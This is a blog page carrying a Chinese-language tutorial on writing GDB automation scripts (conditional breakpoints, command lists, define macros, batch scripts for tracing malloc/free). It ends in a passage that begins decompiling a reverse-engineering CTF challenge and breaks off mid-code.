<!DOCTYPE html>





<html lang="">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.9.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">

<link rel="stylesheet" href="/css/main.css?v=7.4.0">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">


<script id="hexo-configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '7.4.0',
    exturl: false,
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    copycode: {"enable":false,"show_result":false,"style":null},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
    bookmark: {"enable":false,"color":"#222","save":"auto"},
    fancybox: false,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    algolia: {
      appID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    path: 'search.xml',
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    translation: {
      copy_button: 'Copy',
      copy_success: 'Copied',
      copy_failure: 'Copy failed'
    },
    sidebarPadding: 40
  };
</script>

  <meta name="description" content="Resit much,Obey little">
<meta property="og:type" content="website">
<meta property="og:title" content="ZERO-A-ONE">
<meta property="og:url" content="http://yoursite.com/page/4/index.html">
<meta property="og:site_name" content="ZERO-A-ONE">
<meta property="og:description" content="Resit much,Obey little">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ZERO-A-ONE">
<meta name="twitter:description" content="Resit much,Obey little">
  <link rel="canonical" href="http://yoursite.com/page/4/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: true,
    isPost: false,
    isPage: false,
    isArchive: false
  };
</script>

  <title>ZERO-A-ONE</title>
  








  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">
  <div class="container use-motion">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">ZERO-A-ONE</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
      
      
      
        
        <li class="menu-item menu-item-home">
      
    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>

  </li>
      
      
      
        
        <li class="menu-item menu-item-archives">
      
    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a href="javascript:;" class="popup-trigger">
        
          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Search</a>
      </li>
    
  </ul>

</nav>
  <div class="site-search">
    <div class="popup search-popup">
    <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocorrect="off" autocapitalize="none"
           placeholder="Searching..." spellcheck="false"
           type="text" id="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result"></div>

</div>
<div class="search-pop-overlay"></div>

  </div>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
            

          <div id="content" class="content">
            
  <div id="posts" class="posts-expand">
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/02/GDB╫╘╢»╗»╜┼▒╛▒α╨┤▒╩╝╟╥╗/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/12/02/GDB╫╘╢»╗»╜┼▒╛▒α╨┤▒╩╝╟╥╗/" class="post-title-link" itemprop="url">GDB自动化脚本编写笔记一</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-12-02 04:21:51 / Modified: 20:22:04" itemprop="dateCreated datePublished" datetime="2019-12-02T04:21:51-08:00">2019-12-02</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>作为UNIX/Linux下使用广泛的调试器，gdb不仅提供了丰富的命令，还引入了对脚本的支持：一种是对已存在的脚本语言支持，比如python，用户可以直接书写python脚本，由gdb调用python解释器执行；另一种是命令脚本，用户可以在脚本中书写gdb已经提供的或者自定义的gdb命令，再由gdb执行</p>
<p>我们通常都是在交互模式下使用 GDB 的，即手动输入各种 GDB 命令。其实 GDB 也支持执行预先写好的调试脚本，进行自动化的调试。调试脚本由一系列的 GDB 命令组成，GDB 会顺序执行调试脚本中的命令</p>
<h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>下面是一个带bug的二分查找实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binary_search</span><span class="params">(<span class="keyword">int</span> *ary, <span class="keyword">unsigned</span> <span class="keyword">int</span> ceiling, <span class="keyword">int</span> target)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">floor</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (ceiling &gt; <span class="built_in">floor</span>) &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> pivot = (ceiling + <span class="built_in">floor</span>) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (ary[pivot] &lt; target)</span><br><span class="line">            <span class="built_in">floor</span> = pivot + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (ary[pivot] &gt; target)</span><br><span class="line">            ceiling = pivot - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> pivot;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; binary_search(a, <span class="number">5</span>, <span class="number">7</span>) &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// -1</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; binary_search(a, <span class="number">5</span>, <span class="number">6</span>) &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 4</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; binary_search(a, <span class="number">5</span>, <span class="number">5</span>) &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 期望3，实际运行结果是-1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>你打算调试下<code>binary_search(a, 5, 5)</code>这个组合。若如果用print大法，就在<code>binary_search</code>中插入几个print，运行后扫一眼，看看<code>target=5</code>的时候运行流是怎样的</p>
<p>debugger大法看似会复杂一点，如果在<code>binary_search</code>中插断点，那么前两次调用只能连按<code>c</code>跳过。其实没那么复杂，gdb允许用户设置条件断点。你可以这么设置：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b binary_search <span class="keyword">if</span> target == <span class="number">5</span></span><br></pre></td></tr></table></figure>

<p>现在就只有第三次调用会触发断点</p>
<p>问题看上去跟<code>floor</code>和<code>ceiling</code>值的变化有关。要想观察它们的值，可以<code>p floor</code>和<code>p ceiling</code>。不过有个简单的方法，你可以对它们设置watch断点：<code>wa floor if target == 5</code>。当<code>floor</code>的值变化时，就会触发断点</p>
<p>对于我们的示例程序来说，靠脑补也能算出这两个值的变化，专门设置断点似乎小题大做。不过在调试真正的程序时，watch断点非常实用，尤其当你对相关代码不熟悉时。使用watch断点可以更好地帮助你理解程序流程，有时甚至会有意外惊喜。另外结合debugger运行时修改值的能力，你可以在值变化的下一刻设置目标值，观察走不同路径会不会出现类似的问题。如果有需要的话，还可以给某个内存地址设断点：<code>wa *0x7fffffffda40</code></p>
<p>除了watch之外，gdb还有一类catch断点，可以用来捕获异常/系统调用/信号。因为用途不大（我从没实际用过），就不介绍了，感兴趣的话在gdb里面<code>help catch</code>看看</p>
<h2 id="commands"><a href="#commands" class="headerlink" title="commands"></a>commands</h2><p>编写调试脚本时必须要处理好断点的问题。在交互模式下，程序执行至脚本时，GDB 会等待用户输入下一步的命令。如何在脚本中定义断点触发时进行的操作？这需要一种类似回调函数的机制</p>
<p>GDB 中使用 <strong>Breakpoint Command Lists</strong> 的机制来实现这一点，可以给某个断点挂上待触发的命令。用户可以定义，当程序停在某个 breakpoint (或 watchpoint, catchpoint) 时，执行由 <code>command-list</code> 定义的一系列命令。其语法为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">commands [<span class="built_in">list</span>…]</span><br><span class="line">… command-<span class="built_in">list</span> …</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>例如，我想在每次进入 <code>foo</code> 函数且其参数 <code>x</code> &gt; 0 时打印 <code>x</code> 的值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">break</span> foo <span class="keyword">if</span> x&gt;<span class="number">0</span></span><br><span class="line">commands</span><br><span class="line">silent</span><br><span class="line"><span class="built_in">printf</span> <span class="string">"x is %d\n"</span>,x</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>这里有几点要注意的：</p>
<ul>
<li>Breakpoint command list 中的第一个命令通常是 <code>silent</code>。这会让断点触发是打印的消息尽量精简。如果 <code>command … end</code> 中没有 <code>printf</code> 之类的打印语句，断点触发时甚至不会产生任何输出</li>
<li>Breakpoint command list 中的最后一个命令通常是 <code>continue</code>。这样程序不会在断点处停下，自动化调试脚本可以继续执行</li>
</ul>
<p>GDB 运行自动化调试脚本的方式为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb [program] -batch -x [commands_file] &gt; <span class="built_in">log</span></span><br></pre></td></tr></table></figure>

<p>其中 <code>-batch</code> 参数将 GDB 运行为脚本模式（不进入交互环境），<code>-x</code> 参数 (也可以写为 <code>-command</code>) 指定调试脚本文件</p>
<h2 id="define"><a href="#define" class="headerlink" title="define"></a>define</h2><p>举个例子，继续上面的二分查找操作<code>b binary_search if target == 5</code>之后，输入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">comm</span><br><span class="line">i locals</span><br><span class="line">i args</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>按照之前的格式也可以是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b binary_search if target == 5</span><br><span class="line">commands</span><br><span class="line">silent</span><br><span class="line">i locals</span><br><span class="line">i args</span><br><span class="line">continue</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>这样当上面的断点被触发时，<code>i locals</code>和<code>i args</code>命令会被触发，列出当前上下文内的变量。这个功能挺废的，因为你完全可以在断点被触发后才敲入这几个命令</p>
<p>要不是有<code>define</code>，<code>commands</code>就真成摆设了。接下来我们要介绍<code>commands</code>的好基友、最强大的gdb命令之一，<code>define</code>命令</p>
<p>一如unix世界里面的许多程序一样，gdb内部实现了一门DSL（领域特定语言）。用户可以通过这门DSL来编写自定义的宏，甚至编写调试用的自动化脚本。我们可以用<code>define</code>命令编写自定义的宏</p>
<p>继续上面的例子，你可以自定义一个命令代替<code>b xxx comm ...</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) define br_info</span><br><span class="line">Type commands <span class="keyword">for</span> definition of <span class="string">"br_info"</span>.</span><br><span class="line">End with a line saying just <span class="string">"end"</span>.</span><br><span class="line">&gt;b $arg0</span><br><span class="line">&gt;comm</span><br><span class="line">&gt;i locals</span><br><span class="line">&gt;i args</span><br><span class="line">&gt;end</span><br><span class="line">(gdb) br_info binary_search <span class="keyword">if</span> target == <span class="number">5</span></span><br></pre></td></tr></table></figure>

<p>当<code>if target == 5</code>条件满足时，<code>br_info binary_search</code>会被执行。<code>br_info</code>展开成为一系列命令，并用<code>binary_search</code>替换掉<code>$arg0</code>。一行顶过去五行</p>
<p>其实<code>define</code>也就是自定义命令，格式是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">define commandName  </span><br><span class="line">    statement  </span><br><span class="line">    ......  </span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>其中<code>statement</code>可以是任意gdb命令。此外自定义命令还支持最多10个输入参数：<code>$arg0</code>，<code>$arg1</code> …… <code>$arg9</code>，并且还用<code>$argc</code>来标明一共传入了多少参数</p>
<p>则上面的命令可以写为脚本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">define br_info</span><br><span class="line">	b $arg0</span><br><span class="line">	commands</span><br><span class="line">	silent</span><br><span class="line">	i locals</span><br><span class="line">	i args</span><br><span class="line">	<span class="keyword">continue</span></span><br><span class="line">	end</span><br></pre></td></tr></table></figure>

<p>除了在会话内创建自定义宏外，我们还可以用gdb的DSL编写宏文件，并导入到gdb中</p>
<p>举个有实际意义的例子。由于源代码的改变，我们需要更新断点的位置。通常的做法是删掉原来的断点，并新设一个。让我们现学现用，用宏把这两步合成一步：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># gdb_macro</span><br><span class="line">define mv</span><br><span class="line">    <span class="keyword">if</span> $argc == <span class="number">2</span> # argc即总参数个数</span><br><span class="line">        <span class="keyword">delete</span> $arg0 # arg0即第一个参数</span><br><span class="line">        # 注意新创建的断点编号和被删除断点的编号不同</span><br><span class="line">        <span class="keyword">break</span> $arg1 # arg1即第二个参数</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        print <span class="string">"输入参数数目不对，help mv以获得用法"</span></span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"># (gdb) help mv 会输出以下帮助文档</span><br><span class="line">document mv</span><br><span class="line">Move breakpoint.</span><br><span class="line">Usage: mv old_breakpoint_num new_breakpoint</span><br><span class="line">Example:</span><br><span class="line">    (gdb) mv <span class="number">1</span> binary_search -- move breakpoint <span class="number">1</span> to `b binary_search`</span><br><span class="line"></span><br><span class="line">end</span><br><span class="line"># vi:<span class="built_in">set</span> ft=gdb ts=<span class="number">4</span> sw=<span class="number">4</span> et</span><br></pre></td></tr></table></figure>

<p>使用方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b binary_search</span><br><span class="line">Breakpoint 1 at 0x40083b: file binary_search.cpp, line 7.</span><br><span class="line">(gdb) source ~/gdb_macro</span><br><span class="line">(gdb) help mv</span><br><span class="line">Move breakpoint.</span><br><span class="line">Usage: mv old_breakpoint_num new_breakpoint</span><br><span class="line">Example:</span><br><span class="line">    (gdb) mv 1 binary_search -- move breakpoint 1 to `b binary_search`</span><br><span class="line"></span><br><span class="line">(gdb) mv 1 binary_search.cpp:18</span><br><span class="line">Breakpoint 2 at 0x4008ab: file binary_search.cpp, line 18.</span><br></pre></td></tr></table></figure>

<p>在gdb中执行脚本要使用source命令，例如：“source xxx.gdb”</p>
<p>还可以进一步，把<code>source ~/gdb_macro</code>也省掉。你可以创建gdb配置文件<code>~/.gdbinit</code>，让gdb启动时自动执行里面的指令。如果把自己常用的宏写在该文件中，就能直接在gdb里面使用了，用起来如内置命令一般顺滑</p>
<h2 id="document"><a href="#document" class="headerlink" title="document"></a>document</h2><p>除此以外，还可以为自定义命令写帮助文档，也就是执行<code>help</code>命令时打印出的信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document myassign</span><br><span class="line">    assign the second parameter value to the first parameter</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<h2 id="会话-历史-命令文件"><a href="#会话-历史-命令文件" class="headerlink" title="会话/历史/命令文件"></a>会话/历史/命令文件</h2><p>通常我们只有在程序出问题才会启动gdb，开始调试工作，调试完毕后退出。不过，让gdb一直开着未尝不是更好的做法。每个gdb老司机都懂得，gdb在<code>r</code>的时候会加载当前程序的最新版本。也即是说，就算不退出gdb，每次运行的也会是当前最新的版本。不退出当前调试会话有两个好处：</p>
<ol>
<li>调试上下文可以得到保留。不用每次运行都重新设一轮断点</li>
<li>一旦core dump了，可以显示core dump的位置，无需带着core重新启动一次</li>
</ol>
<p>在开发C/C++项目，我一般是这样的工作流程：一个窗口开着编辑器，编译也在这个窗口执行；另一个窗口开着gdb，这个窗口同时也用来运行程序。一旦要调试了（或者，又segment fault了），随手就可以开始干活</p>
<p>当然了，劳作一天之后，总需要关电脑回家。这时候只能退出gdb。不想明天一早再把断点设上一遍？gdb提供了保留断点的功能。输入<code>save br .gdb_bp</code>，gdb会把本次会话的断点存在<code>.gdb_bp</code>中。明天早上一回来，启动gdb的时候，加上<code>-x .gdb_bp</code>，让gdb把<code>.gdb_bp</code>当做命令文件逐条重新执行，一切又回到昨晚</p>
<h2 id="调试脚本"><a href="#调试脚本" class="headerlink" title="调试脚本"></a>调试脚本</h2><p>提到用<code>-x</code>指定命令文件来回放断点。那时的命令文件也算是一种用gdb的DSL编写的调试脚本。由于调试是件交互性的活，需要事先写好调试脚本的场景不多。即使如此，除了让gdb自动设置断点，依然有不少场景下可以用上调试脚本。其中之一，就是让gdb自动采集特定函数调用的上下文数据。我把这种方法称为“拖网法”，因为它就像拖网捕鱼一样，把逮到的东西都一股脑带上来</p>
<p>设想如下的情景：某个项目出现内存泄露的迹象。事先分配好的内存池用着用着就满了，一再地吞噬系统的内存。内存管理是自己实现的，所以无法用valgrind来分析。鉴于内存管理部分代码最近几个版本都没有改动过，猜测是业务逻辑代码里面有谁借了内存又不还。现在你需要把它揪出来。一个办法是给内存的分配和释放加上日志，再编译，然后重新运行程序，谋求复现内存泄露的场景。不过更快的办法是，敲上这一段代码：</p>
<p>（假设分配内存的接口是<code>my_malloc(char *p, size_t size)</code>，释放内存的接口是<code>free(char *p)</code>）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># /tmp/malloc_free</span><br><span class="line"># 设置输出不要分屏</span><br><span class="line">set pagination off</span><br><span class="line">b my_malloc</span><br><span class="line">comm</span><br><span class="line">silent</span><br><span class="line">printf &quot;malloc 0x%x %lu\n&quot;, p, size</span><br><span class="line">bt</span><br><span class="line">c</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">b my_free</span><br><span class="line">comm</span><br><span class="line">silent</span><br><span class="line">printf &quot;free 0x%x\n&quot;, p</span><br><span class="line">bt</span><br><span class="line">c</span><br><span class="line">end</span><br><span class="line">c</span><br></pre></td></tr></table></figure>

<p>直接让gdb执行它：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gdb -q -p $(pidof $your_project) -x /tmp/malloc_free &gt; log</span><br></pre></td></tr></table></figure>

<p>运行一段时间后kill掉gdb，打开log看看里面的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ less log</span><br><span class="line">Attaching to process 8738</span><br><span class="line">Reading symbols from ...done.</span><br><span class="line">Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...Reading symbols from /usr/</span><br><span class="line">lib/debug//lib/x86_64-linux-gnu/libc-2.19.so...done.</span><br><span class="line">done.</span><br><span class="line">Loaded symbols for /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">......</span><br><span class="line">malloc 0x0 82</span><br><span class="line">#0  my_malloc (p=0x0, size=82) at memory.cpp:8</span><br><span class="line">#1  0x0000000000400657 in write_buffer (p=0x0, size=82) at memory.cpp:17</span><br><span class="line">#2  0x00000000004006b6 in main () at memory.cpp:25</span><br><span class="line">malloc 0x852c39c0 13</span><br><span class="line">#0  my_malloc (p=0x7ffd852c39c0 &quot;\001&quot;, size=13) at memory.cpp:8</span><br><span class="line">#1  0x0000000000400657 in write_buffer (p=0x7ffd852c39c0 &quot;\001&quot;, size=13) at memory.cpp:17</span><br><span class="line">#2  0x00000000004006b6 in main () at memory.cpp:25</span><br><span class="line">free 0x400780</span><br><span class="line">#0  my_free (p=0x400780 &lt;__libc_csu_init&gt; &quot;AWA\211\377AVI\211\366AUI\211\325ATL\215%x\006 &quot;) at memory.cpp:14</span><br><span class="line">#1  0x0000000000400632 in read_buffer (p=0x400780 &lt;__libc_csu_init&gt; &quot;AWA\211\377AVI\211\366AUI\211\325ATL\215%x\006 &quot;) at memory.cpp:16</span><br><span class="line">#2  0x00000000004006fe in main () at memory.cpp:28</span><br><span class="line">free 0x0</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>现在我们可以写个脚本对下帐。每次解析到<code>malloc</code>时，在对应指针的名下记下一项借出。解析到<code>free</code>时，表示销掉对应最近一次借出的还款。把全部输出解析完后，困扰已久的坏账情况就将水落石出，欠钱不还的老赖也将无可遁形。这种“拖网法”真的是简单粗暴又有效</p>
<p>我们还可以用这种“拖网法”获取指定函数的调用者比例、调用参数的分布范围等等。注意，不要在生产环境撒网，毕竟这么做对性能有显著影响。而且要做统计的话，也有更好的方法可以选</p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>题目：reverse-box</p>
<p>来源：mma-ctf-2nd-2016</p>
<ul>
<li><h4 id="IDA分析代码"><a href="#IDA分析代码" class="headerlink" title="IDA分析代码"></a>IDA分析代码</h4></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2)</span> <span class="comment">//a2即为二维数组</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [esp+18h] [ebp-10Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-108h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+11Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"usage: %s flag\n"</span>, *a2);<span class="comment">//a2[0]存输入的数据</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_804858D(&amp;v4);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a2[<span class="number">1</span>]); ++i )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%02x"</span>, *((<span class="keyword">unsigned</span> __int8 *)&amp;v4 + a2[<span class="number">1</span>][i]));</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> <span 